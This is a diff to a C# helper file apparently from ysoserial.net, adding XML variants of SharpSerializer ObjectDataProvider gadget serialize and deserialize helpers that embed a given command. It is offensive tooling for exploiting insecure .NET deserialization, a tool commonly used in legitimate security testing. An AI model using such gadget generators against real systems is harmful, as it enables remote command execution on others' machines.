@@ -792,23 +792,46 @@ namespace ysoserial.Helpers
         }
 
         /// <summary>
-        /// Serializes a sharp serializer ObjectDataProvider gadget with a specified command to a byte array object.
+        /// Serializes a binary SharpSerializer ObjectDataProvider gadget with a specified command to a byte array object.
         /// </summary>
         /// <param name="command">The command to include.</param>
         /// <returns>The serialized object.</returns>
         public static object SharpSerializer_ObjectDataProvider_Binary_Serialize(string command)
         {
-            return SharpSerializerHelperMethods.GenerateSharpSerializerPayload(command);
+            return SharpSerializerHelperMethods.GenerateSharpSerializerBinaryPayload(command);
         }
 
         /// <summary>
-        /// Deserializes a raw binary SharpSerializer payload object.
+        /// Deserializes a binary SharpSerializer payload object.
         /// </summary>
         /// <param name="serializedData">The raw serialized object.</param>
         public static void SharpSerializer_ObjectDataProvider_Binary_Deserialize(object serializedData)
         {
             SharpSerializer serializer = new SharpSerializer(true);
             using (MemoryStream memoryStream = new MemoryStream((byte[])serializedData))
+            {
+                serializer.Deserialize(memoryStream);
+            }
+        }
+
+        /// <summary>
+        /// Serializes an XML SharpSerializer ObjectDataProvider gadget with a specified command to a byte array object.
+        /// </summary>
+        /// <param name="command">The command to include.</param>
+        /// <returns>The serialized object.</returns>
+        public static string SharpSerializer_ObjectDataProvider_Xml_Serialize(string command)
+        {
+            return SharpSerializerHelperMethods.GenerateSharpSerializerXmlPayload(command);
+        }
+
+        /// <summary>
+        /// Deserializes an XML SharpSerializer payload object.
+        /// </summary>
+        /// <param name="serializedData">The raw serialized object.</param>
+        public static void SharpSerializer_ObjectDataProvider_Xml_Deserialize(string serializedData)
+        {
+            SharpSerializer serializer = new SharpSerializer(false);
+            using (MemoryStream memoryStream = new MemoryStream(Encoding.Default.GetBytes(serializedData)))
             {
                 serializer.Deserialize(memoryStream);
             }
